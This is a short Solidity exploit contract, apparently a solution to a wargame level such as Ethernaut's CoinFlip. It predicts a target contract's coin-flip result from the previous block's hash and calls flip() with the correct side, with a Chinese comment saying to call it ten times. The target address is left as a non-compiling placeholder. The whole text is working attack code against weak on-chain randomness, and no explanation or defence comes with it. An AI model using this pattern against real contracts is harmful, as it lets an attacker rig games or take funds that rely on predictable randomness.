contract Attack{
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip expFlip = CoinFlip(address);
    
    //调用十次这个函数
    function pwn() public {
         uint256 blockValue = uint256(blockhash(block.number-1));
          uint256 coinFlip = blockValue /FACTOR;
          bool side = coinFlip == 1 ? true : false;
          expFlip.flip(side);
    }
}
